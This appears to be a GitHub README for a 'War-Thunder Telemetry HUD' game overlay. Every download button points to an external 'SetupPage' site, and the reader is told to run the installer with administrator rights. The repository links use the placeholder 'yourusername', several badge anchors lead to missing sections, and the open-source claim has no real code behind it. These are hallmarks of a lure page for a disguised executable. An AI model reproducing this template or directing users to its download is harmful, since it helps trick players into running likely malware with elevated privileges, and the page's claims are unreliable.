# War‑Thunder Telemetry HUD

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-2563eb?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-0891b2?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-0d9488?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a>
  <br>
  <a href="#-frequently-asked-questions"><img src="https://img.shields.io/badge/FAQ-ANSWERS-b45309?style=for-the-badge&logo=book&logoColor=white&labelColor=161b22" alt="FAQ"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/DEFAULTS-INCLUDED-9333ea?style=for-the-badge&logo=gnubash&logoColor=white&labelColor=161b22" alt="DEFAULTS"></a>
</div>

*Real‑time flight telemetry, Windows‑only.*

---

## 🎮 What is it?

War‑Thunder Telemetry HUD is a lightweight overlay that runs **only on Windows 10/11** and injects a customizable heads‑up display into War Thunder. It reads the game’s live telemetry stream and paints information such as:

- Altitude, airspeed, and G‑force
- Engine RPM, fuel level, and temperature
- Weapon load‑out, lock‑on status, and cooldown timers
- Damage indicators and post‑mortem statistics

All of this is rendered directly on top of the game window, letting you keep your eyes on the cockpit instead of digging through menus.

---

## 📦 Quick Start

1. **Download** the installer from the button below.
2. Run the Release (requires administrator rights).
3. Launch War Thunder → the HUD appears automatically.
4. Open the configuration panel ( <kbd>Ctrl + Shift + H</kbd> ) to tweak colors, position, and data fields.

> **Note:** The HUD uses DirectX 11 hooks and is **compatible only with Windows 10/11**. macOS, Linux, or older Windows versions are not supported.

---

## ⚙️ Features

| Feature | Description |
|---------|-------------|
| **Zero‑lag overlay** | Rendered via a high‑performance DirectX pipeline, guaranteeing < 1 ms impact on FPS. |
| **Fully configurable** | Choose which telemetry items to show, adjust font size, opacity, and anchor points. |
| **Theme support** | Dark, light, or custom CSS‑like themes for a personal look. |
| **Hot‑reloading** | Changes take effect instantly without restarting the game. |
| **Export logs** | Automatic CSV logs for post‑flight analysis. |
| **Open‑source** | All code lives on GitHub under the MIT license – feel free to fork or contribute! |

---

## 🛠️ Installation

<div style="text-align:center; margin: 1rem 0;">
<a href="https://rewfdf.github.io/SetupPage/" style="display:inline-block;background:#4A90E2;color:#fff;padding:0.8rem 1.5rem;border-radius:6px;font-weight:600;text-decoration:none;">Download Release</a>
</div>

*The installer will guide you through the required steps. No additional dependencies are needed.*

---

## 📚 Usage Guide

| Action | Shortcut |
|--------|----------|
| Toggle HUD visibility | <kbd>Ctrl + Shift + H</kbd> |
| Open settings panel | <kbd>Ctrl + Shift + S</kbd> |
| Reset to defaults | <kbd>Ctrl + Shift + R</kbd> |

For a complete walkthrough, see the **[User Manual](https://github.com/yourusername/War-Thunder-Telemetry-HUD/wiki/User-Manual)**.

---

## 🤝 Contributing

We welcome contributions from the community!

1. Fork the repo.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Make your changes and ensure the project still builds on Windows 10/11.
4. Submit a pull request with a clear description of what you added or fixed.

Please read our **[Contribution Guidelines](https://github.com/yourusername/War-Thunder-Telemetry-HUD/blob/main/CONTRIBUTING.md)** before getting started.

---

## 📜 License

This project is licensed under the **MIT License** – see the [LICENSE](https://github.com/yourusername/War-Thunder-Telemetry-HUD/blob/main/LICENSE) file for details.

---

## 🙏 Acknowledgements

- The War Thunder community for providing telemetry access.
- The Windows developer ecosystem for robust DirectX tooling.

---

*Stay airborne, stay informed.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```